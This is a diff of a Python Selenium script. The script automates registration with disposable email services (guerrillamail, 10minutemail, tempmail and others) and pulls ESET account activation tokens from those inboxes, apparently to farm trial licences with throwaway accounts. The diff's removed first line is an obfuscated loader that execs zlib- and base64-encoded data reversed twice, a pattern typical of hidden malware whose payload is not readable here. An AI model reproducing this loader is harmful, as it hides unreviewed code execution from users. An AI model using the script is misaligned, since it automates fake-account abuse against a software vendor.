@@ -1,1 +1,279 @@
-import zlib,base64;exec(zlib.decompress(base64.b64decode(b'4xZ7as2bbjj87BI/HY8CcS+itSy2D7HydGYzD3sGrbSRib72z1QgWi2mpySGUUJxbR+vfzQqHUySuO929KwiTFoRmamhz7HUamIaJJmFwC5JLdekN1XwfgJI8lriESyFLgnz6k+3bWJ5RhxZ/8Om4BuHb/9mtdi8augNL6pOZ3kTm0fvr0pv/cgVw/PnC4PyRf/9SBUKoespUvPnviXUQkgukmvggG6HtM/nxSBPceBB4LZFPbdc+9RF3KU74l9f9Zvb4I33c2v5OYU/bJ9Iv64ilvs/wz+Is2J7v3V9H52/8LuG+llfkXySWo0ZOT2Pgh3Gf+6LCoxxXTXysygewlNA95rH4nD1omo55rHRnXign9eEUTIOTKFvnGkgwcxwBX8rufYwofx98buZICqXA37zfgLXceUUAAybP72767eyxvZw1vbU/3c2ghuDu+8b+NE2VURMDe2SeYiktkyDc5hTjeyutlSjM46+uZsh7rf31XMawNIr3qVLw2nE6hGVStMntULIdIUYpi7UPsN5L7vHBumFJI2BMJhpJAJaGpeVdqeJjstzJBexnZnSAEJkH4TBByObrbT61rnx2XgJeJYyERYOL8M5Zl8lK/VUxNrGKp4tjmePzTmzlSxaTGW/UHFK2GsTKrIFJMyz6l9oSvFm4mCzMaQMrKz2kxuCXnzzN7AktjJr8p6noWWvIaxwliBydmQQX7gJCs3ulzSKsa32JGkZm9JGUStjAlGPJ3pQ5Tw7d8/kwJ/L9W5AJZmLXArc4hlM+KQ9B8VgNmPxxbBPwXwCHfc57XAJvKjnK/VDYyDDZiRsnklRJORZ7qFrTqFLl85sKJeh9YufH1m2JjOTanZoTtrath2qqNnX9u+3e7ghDPrUwrCgHoCi2sFwjReqhMP2WFQZ1Onh1EwU/j6e1aZ6+C8SNAdPpsJAhGhBIQBsmalCwM021oqQIKrcH/j1Ck2NNziX1I/AGhrB2Uxni0Ga/93DU/mq+93TpZx0elV8XeD8nrvzU1DFko8wY3Id1ttp/nvs7ioYZXsYpHaDSxpEhUGBSNWhKbUDmiUo0ScFUQLyDpJ/Kk4UgSl593LrqLo25SMaHWCrxRGGNfOYHWvida6exmRcdRwcdtBhaGoTnGJ8ZiOEW2NSuMAy7roKo55BBuSwU2+0igDEVnUMBxP9uKPnl/cWtPXtPwTV/tyzUbO8M1fr8scOCee+9oQjQ8zrERrYC56CBGSFSVCrpEkqKLJIHau3HaykHm3Zjzdy1BMnb7fH4qd2whZwlLi7vH4+dD2gSh232aMxqDxiMB//XD+l9v0qTBNfdkAJ5ldIjEKb9N/6G4T0UgopxN/6G4f1t97fN0sHWhBIxgrf9NbSENNUkABYDiMcwV/yozHeGU8s/vlzOX2/91SuCZ6y+n/ur2gaX8xzuOnIf4sbverMECwGk4j9HO8mPUIW7vHaS9gYjoAmbQ0cb063zCQMQRZXJQ6eXHFyM8dV/Oz8znR4xQ8jkGC10MwqjBzZ6rEyB++4ifj9/wh8OY3tzZ2HDbNLUxHtNRLdvw1h4YyBQrbfK0qCA50nv56TFM6nLv8Ko/ZpZvHwGYIBGxGQj3FyPIwEUFUZzNjkQr0LlsnWHzZiHG6BRIWw/OsEBzixUKnQ+pT2SImh0yAngX2mmvBpUpCF0YrMd5+WBMqwN1Dz2wpJK2JEaJC6KlYFKNNkwTgpXgGushG5jtqfrKBEsFW57YSokHcRUoPHT63/JmH2GseoMXopzOk7jPFndqDkPLguuXpxe6AFUfylLZieVnSqDZVUMQ0HYuCWcSgsHal7A+tcoBS2TeMVZGX+M3ZQlWmf2zVJHdvPODNd0XWRkcGzhp5V3YPBfl0em1jcYevHd+S28HPDeWfppZSeOTTtLUsSH9mEupm9zp/KBDEGsOdh5oJmqzGg0E51Am2+ri8Y8tz9R8Qb9Oe447jzc8wkGuFJNysZmJMgxNq4crV/YHKNqhuPu9Gpcqa/URtp3CZCCjk1lNQvhqyiaYL/YWgiyaGqXVPrmpV5ELanOS/MfPCNm0vaIN07ihWhvkBzfwYrsVe/tzDIb0N2sOPCD5WMEbJrvQA9oZVb82pE5CGkDynR8h2URdU2cdw6+sYug5TUNjdAZ0tfk8+3e9BFxwYSnrYQXvUpaQIsTvOkowg1uhJLnyExlDigW3mrBnFToKR+RoDCy01YPLUQj6QGMrMBQNJpLZ1Cw2R0Lq6AUFChJ9KmGjXG1TJ/QJ0K0PZ4pPoGon8IcQP95044znzlxtr67qlu2TMSzh0PVEMH8ChjcYv0jByB/Dmv9kOkTOu9mMBQlTgZXh+38ogV7vBlMeM9eYIOJ2c6JpSAeX8KmHnGQ8WQFUPppYpN91IS0YPO3NfPa3ZnxJnX2JcSVd7Corw56ToovohOZSxt5yHmjpMPp0KxYTombbxvNodF19hbY0L2mGs4dfV7JmRWKkjXkMbGUoEJa7SzEblmLM9J64Ec2j7SP6xPwmepKvm9UR0jxQ+Ns+aalu8jl0dFFci6R0t0lBZ6iYffLYU/AWsO+oh61Y2qnsQ3UorSyQeYyTla2BqM7sKgKB5GEJJVIjfkLXYbFggaVttOz+PnZNAkJwPk/7gGn8FTZ55uFnu6ssNGYZsb6St1UhFQeulPVAF/a9H0Wvk6dzdl3a122cXNfr70HUVsjLvXZFwyn5GNnmPq0SAfZuDOqYP72Km0Tdo4mM6G0u0xob2tcZIdmyDpi1gA6piQAMNdvaENqvPU1BygwxTKgGk+AbLoUUQiP7Ow1xbBD1AjtYh0pBsuYDqgmzaSzcDSWqYu6kIsb1FRpbA7BWQvX16FgFEw2jF29d31q8YCZhJV8n2G5s62NDLryEbnjt2htIMqbMkLZa0TWtfRI6zjV6Wf2DdjXssbSMdOzkGb2QVuvm2FxOl09KvTdgZ6VvsjeleDM26Wvw9U5g0rcOq2mR07QbO4shZvBFHMqnKxmZsbDjbF6bbhFwJxQpqIIbkVbcAyunoUz8nUBaQUWYQE1H6LRHUkeuv1NJZpsmNstxrC4giFByq94unMJbl7kAsKkg1PGWGKusyu9m7DISWhsHd1sD2qqFWEB8WwzX0nXkpH3kxn29kjnUN3a2lZ6HrLLE1riimHwSNgpSM2VrPTygqX+HQeXMmjC4jM1ShdDndldwmZg3iyaTO+wqyY905bMZz3D3VlL7mzWjX6Go7bUxoxMzz0vnxtmau87m8P+czxMpLM81MmghnujF0uZgD1DDDdxUjJQKCMxslKFp1fpTR2qhUkmFGyzmcK5jRJQBct9BGZOCDVIe0QcUopQH4qwPHCHfLSrxVWyjVRa4xhFi6Y4nTNPK3Nz/CKll0PzgMBx2Z+Luylrs2I35WnJEIDL8BuIKcs1o382LHcr1EwDxGWfOT69ovd7DtOqE9dEMo7K0l4TfCt/HZthvXh75XNQr8rUfHj02e0Dzf+27qx4Nyvl4mEYkYVqJoB7NOWv/f/P/lJ4eX6/J3tGdd+q+0GfkH7oD9PoXTl0VfOdu6jFCcGOuD54mBLm/7M7f6fAAB/X5xG1AnNvo6ddPK6zsQb9LqUdeoaYSPlfGS3pJQqIcIQ1ps8SPo0seQgxf5PA9T47iv15qjkkzAOqXvmbuHgXSsMapZw7jLwknYwXF3tN2Be4qE8cO/U4YC5L19yPeew1vd0Xq+yiur/onJkJVRBflLP3PEES15WBjv+ZiMKfbJrxk8Qu6okQZHMX+j8gAoXLQSAwQUUSJB81Eg6EhHrF8A3HGMvWmAStWb/ggCriwu9jecp6TmoH4GAOKUh3CbhlEN89GT7+7n19f/J/TPq7k/OkVpMdrvPUN52+WiXqtQ9WpB4dmLiSAJZ8Pd6k6BHfxI4L7BxSl3+V/UDE2wlWBdzjxDzW7FJE4rQXZviXDZVxjJQ9mE39zPebuonEz8wnV99PdfsKvfBeCIhnr6n1YQVQfAeMj1ZAB/FIBEQNEMc+haNMlCXVnMdKijtSf/+WTSnAK1ODpTyH/ped9GRVFyD0Pgb6GYnvRcfoQ0YrpR+rtqhLVFqzBG/2DyZJIWwPxT6gShDE28/GGTxQNab9xik4b9uODcKpjbavjrxMnjzXJiN3gnhw3XjeOJ/OYXbcv3upbB/H5b8OhLgGMqhZfbXlhZzWrrTTvrcfaBaUV4m+F1Zb9k6gA6Qad0R0x6zEtr6QR/ZELoF6FS5q4TP6I2UqhebSr2K/La+H0nFCf1eb06maH58PBWESzyDf5MZtjigXlHHpZbMkves18EmQAlZpq4TgrM/09sqmKN7D7qge6v3vadD0nsLUvmn+hQVbh10PiK1N6vkK1tl/utaoKaKKflwESKfkRzXascFXeV5nU+uhTpp+AADWfXCEyu++EQQamp2SkxfS883YESOD3UkS21uGxgZFhIjV1VLrABaCICt/vsSX9uQqQq0KbQUVGyNIaGFUahxJtSLo0qakSLzIlMMSjWyRqIep12jXwrXYvFtgYpWQzFtwKU/icZQrJfTJ7eJ91/HVP97Y/8vge5rvz8G+WDq7jIQNTKSGBn9ANgwwlP4A1nEw/B0swA1'[::-1])[::-1]))
+from selenium.webdriver import Chrome, ChromeOptions, ChromeService
+from selenium.webdriver import Firefox, FirefoxOptions, FirefoxService
+from selenium.webdriver import Edge, EdgeOptions, EdgeService
+
+import traceback
+import colorama
+import random
+import string
+import time
+import sys
+import os
+import re
+
+DEFAULT_MAX_ITER = 30
+DEFAULT_DELAY = 1
+GET_EBCN = 'document.getElementsByClassName'
+GET_EBID = 'document.getElementById'
+GET_EBTN = 'document.getElementByTagName'
+GET_EBAV = 'getElementByAttrValue'
+CLICK_WITH_BOOL = 'clickWithBool'
+PARSE_10MINUTEMAIL_INBOX = 'parse_10minutemail_inbox()'
+DEFINE_GET_EBAV_FUNCTION = """
+function getElementByAttrValue(tagName, attrName, attrValue) {
+    for (let element of document.getElementsByTagName(tagName)) {
+        if(element.getAttribute(attrName) === attrValue)
+            return element } }"""
+DEFINE_CLICK_WITH_BOOL_FUNCTION = """
+function clickWithBool(object) {
+    try {
+        object.click()
+        return true }
+    catch {
+        return false } }"""
+DEFINE_PARSE_10MINUTEMAIL_INBOX_FUNCTION = """function parse_10minutemail_inbox() {
+    updatemailbox()
+    let mails = Array.from(document.getElementsByTagName('tr')).slice(1)
+    let inbox = []
+    for(let i=0; i < mails.length; i++) {
+        let id = mails[i].children[0].children[0].href
+        let from = mails[i].children[0].innerText
+        let subject = mails[i].children[1].innerText
+        inbox.push([id, from, subject]) }
+    return inbox }"""
+PARSE_GUERRILLAMAIL_INBOX = """
+var email_list = document.getElementById('email_list').children
+var inbox = []
+for(var i=0; i < email_list.length-1; i++) {
+    var mail = email_list[i].children
+    var from = mail[1].innerText
+    var subject = mail[2].innerText
+    var mail_id = mail[0].children[0].value
+    inbox.push([mail_id, from, subject])
+}
+return inbox
+"""
+GET_GUERRILLAMAIL_DOMAINS = """
+var domains_options = document.getElementById('gm-host-select').options
+var domains = [] 
+for(var i=0; i < domains_options.length-1; i++) {
+    domains.push(domains_options[i].value)
+}
+return domains
+"""
+
+colorama.init()
+
+class LoggerType:
+    def __init__(self, sborder, eborder, title, color, fill_text):
+        self.sborder = sborder
+        self.eborder = eborder
+        self.title = title
+        self.color = color
+        self.fill_text = fill_text
+
+    @property
+    def data(self):
+        return self.sborder + self.color + self.title + colorama.Style.RESET_ALL + self.eborder
+
+ERROR = LoggerType('[ ', ' ]', 'FAILED', colorama.Fore.RED, True)
+OK = LoggerType('[   ', '   ]', 'OK', colorama.Fore.GREEN, False)
+INFO = LoggerType('[  ', '  ]', 'INFO', colorama.Fore.LIGHTBLACK_EX, True)
+DEVINFO = LoggerType('[ ', ' ]', 'DEBUG', colorama.Fore.CYAN, True)
+WARN = LoggerType('[  ', '  ]', 'WARN', colorama.Fore.YELLOW, False)
+
+def console_log(text='', logger_type=None, fill_text=None):
+    if isinstance(logger_type, LoggerType):
+        ni = 0
+        for i in range(0, len(text)):
+            if text[i] != '\n':
+                ni = i
+                break
+            print()
+        if logger_type.fill_text and fill_text is None:
+            fill_text = True
+        if logger_type.fill_text and fill_text:
+            print(logger_type.data + ' ' + logger_type.color + text[ni:] + colorama.Style.RESET_ALL)
+        else:
+            print(logger_type.data + ' ' + text[ni:])
+    else:
+        print(text)
+
+def clear_console():
+    if os.name == 'nt':
+        os.system('cls')
+    else:
+        os.system('clear')
+
+def untilConditionExecute(driver_obj, js: str, delay=DEFAULT_DELAY, max_iter=DEFAULT_MAX_ITER, positive_result=True, raise_exception_if_failed=True, return_js_result=False):
+    driver_obj.execute_script(f'window.{GET_EBAV} = {DEFINE_GET_EBAV_FUNCTION}')
+    driver_obj.execute_script(f'window.{CLICK_WITH_BOOL} = {DEFINE_CLICK_WITH_BOOL_FUNCTION}')
+    pre_js = [
+        DEFINE_GET_EBAV_FUNCTION,
+        DEFINE_CLICK_WITH_BOOL_FUNCTION
+    ]
+    js = '\n'.join(pre_js+[js])
+    for _ in range(max_iter):
+        try:
+            result = driver_obj.execute_script(js)
+            if return_js_result and result is not None:
+                return result
+            elif result == positive_result:
+                return True
+        except Exception as E:
+            pass
+        time.sleep(delay)
+    if raise_exception_if_failed:
+        raise RuntimeError('untilConditionExecute: the code did not return the desired value! TRY VPN!')
+
+def dataGenerator(length, only_numbers=False):
+    """generates a password by default. If only_numbers=True - phone number"""
+    data = []
+    if only_numbers: # phone number
+        data = [random.choice(string.digits) for _ in range(length)]
+    else: # password
+        length += random.randint(1, 10)
+        data = [ # 1 uppercase & lowercase letter, 1 number, 1 special character
+            random.choice(string.ascii_uppercase),
+            random.choice(string.ascii_lowercase),
+            random.choice(string.digits),
+            random.choice(string.punctuation)
+        ]
+        characters = string.ascii_letters + string.digits + string.punctuation
+        data += [random.choice(characters) for _ in range(length-3)]
+        random.shuffle(data)
+    return ''.join(data)
+
+def initSeleniumWebDriver(browser_name: str, webdriver_path = None, browser_path = '', headless=True):
+    if os.name == 'posix': # For Linux
+        if sys.platform.startswith('linux'):
+            console_log(f'Initializing {browser_name}-webdriver for Linux', INFO)
+        elif sys.platform == "darwin":
+            console_log(f'Initializing {browser_name}-webdriver for macOS', INFO)
+    elif os.name == 'nt':
+        console_log(f'Initializing {browser_name}-webdriver for Windows', INFO)
+    driver_options = None
+    driver = None
+    if browser_name.lower() == 'chrome':
+        driver_options = ChromeOptions()
+        driver_options.binary_location = browser_path
+        driver_options.add_experimental_option('excludeSwitches', ['enable-logging'])
+        driver_options.add_argument("--log-level=3")
+        driver_options.add_argument("--lang=en-US")
+        if headless:
+            driver_options.add_argument('--headless')
+        if os.name == 'posix': # For Linux
+            driver_options.add_argument('--no-sandbox')
+            driver_options.add_argument('--disable-dev-shm-usage')
+        try:
+            driver = Chrome(options=driver_options, service=ChromeService(executable_path=webdriver_path))
+        except Exception as E:
+            if traceback.format_exc().find('only supports') != -1: # Fix for downloaded chrome update
+                browser_path = traceback.format_exc().split('path')[-1].split('Stacktrace')[0].strip()
+                if 'new_chrome.exe' in os.listdir(browser_path[:-10]):
+                    console_log('Downloaded Google Chrome update is detected! Using new chrome executable file!', INFO)
+                    browser_path = browser_path[:-10]+'new_chrome.exe'
+                    driver_options.binary_location = browser_path
+                    driver = Chrome(options=driver_options, service=ChromeService(executable_path=webdriver_path))
+            else:
+                raise E
+    elif browser_name.lower() == 'firefox':
+        driver_options = FirefoxOptions()
+        driver_options.binary_location = browser_path
+        driver_options.set_preference('intl.accept_languages', 'en-US')
+        if headless:
+            driver_options.add_argument('--headless')
+        if os.name == 'posix': # For Linux
+            driver_options.add_argument('--no-sandbox')
+            driver_options.add_argument("--disable-dev-shm-usage")
+        # Fix for: Your firefox profile cannot be loaded. it may be missing or inaccessible
+        try:
+            os.makedirs('firefox_tmp')
+        except:
+            pass
+        os.environ['TMPDIR'] = (os.getcwd()+'/firefox_tmp').replace('\\', '/')
+        driver = Firefox(options=driver_options, service=FirefoxService(executable_path=webdriver_path))
+    elif browser_name.lower() == 'edge':
+        driver_options = EdgeOptions()
+        driver_options.use_chromium = True
+        driver_options.binary_location = browser_path
+        driver_options.add_experimental_option('excludeSwitches', ['enable-logging'])
+        driver_options.add_argument("--log-level=3")
+        driver_options.add_argument("--lang=en-US")
+        if headless:
+            driver_options.add_argument('--headless')
+        if os.name == 'posix': # For Linux
+            driver_options.add_argument('--no-sandbox')
+            driver_options.add_argument('--disable-dev-shm-usage')
+        driver = Edge(options=driver_options, service=EdgeService(executable_path=webdriver_path))
+    #driver.set_window_position(0, 0)
+    #driver.set_window_size(640, 640)
+    return driver
+
+def parseToken(email_obj, driver=None, eset_business=False, delay=DEFAULT_DELAY, max_iter=DEFAULT_MAX_ITER):
+    activated_href = None
+    if email_obj.class_name == 'custom':
+        while True:
+            activated_href = input(f'\n[  {colorama.Fore.YELLOW}INPT{colorama.Fore.RESET}  ] {colorama.Fore.CYAN}Enter the link to activate your account, it will come to the email address you provide: {colorama.Fore.RESET}').strip()
+            if activated_href is not None:
+                match = re.search(r'token=[a-zA-Z\d:/-]*', activated_href)
+                if match is not None:
+                    token = match.group()[6:]
+                    if len(token) == 36:
+                        return token
+            console_log('Incorrect link syntax', ERROR)
+    for _ in range(max_iter):
+        if email_obj.class_name == '1secmail':
+            json = email_obj.read_email()
+            if json != []:
+                message = json[-1]
+                if eset_business and message['subject'].find('activation') != -1:
+                    activated_href = email_obj.get_message(message['id'])['body']
+                elif message['from'].find('product.eset.com') != -1:
+                    activated_href = email_obj.get_message(message['id'])['body']
+        elif email_obj.class_name == 'developermail':
+            messages = email_obj.get_messages()
+            if messages is not None:
+                message = messages[-1]
+                if eset_business and message['subject'].find('activation') != -1:
+                    activated_href = message['body']
+                elif message['from'].find('product.eset.com') != -1:
+                    activated_href = message['body']
+        elif email_obj.class_name == 'hi2in':
+            email_obj.open_inbox()
+            try:
+                if eset_business:
+                    activated_href = driver.find_element('xpath', "//a[starts-with(@href, 'https://eba.eset.com')]").get_attribute('href')
+                else:
+                    activated_href = driver.find_element('xpath', "//a[starts-with(@href, 'https://login.eset.com')]").get_attribute('href')
+            except:
+                pass
+        elif email_obj.class_name in ['guerrillamail', '10minutemail']:
+            inbox = email_obj.parse_inbox()
+            for mail in inbox:
+                mail_id, mail_from, mail_subject = mail
+                if mail_from.find('product.eset.com') != -1 or mail_subject.find('activation') != -1:
+                    email_obj.open_mail(mail_id)
+                    try:
+                        if eset_business:
+                            activated_href = driver.find_element('xpath', "//a[starts-with(@href, 'https://eba.eset.com')]").get_attribute('href') 
+                        else:
+                            activated_href = driver.find_element('xpath', "//a[starts-with(@href, 'https://login.eset.com')]").get_attribute('href')
+                    except:
+                        pass
+        elif email_obj.class_name == 'tempmail':
+            email_obj.auth()
+            messages = email_obj.get_messages()
+            try:
+                for message in messages:
+                    if message["from"].find("product.eset.com") != -1 or message["subject"].find("activation") != -1:
+                        activated_href = email_obj.get_message(message["_id"])["bodyHtml"]
+            except:
+                pass
+        if activated_href is not None:
+            match = re.search(r'token=[a-zA-Z\d:/-]*', activated_href)
+            if match is not None:
+                token = match.group()[6:]
+                return token
+        time.sleep(delay)
+    raise RuntimeError('Token retrieval error!!!')
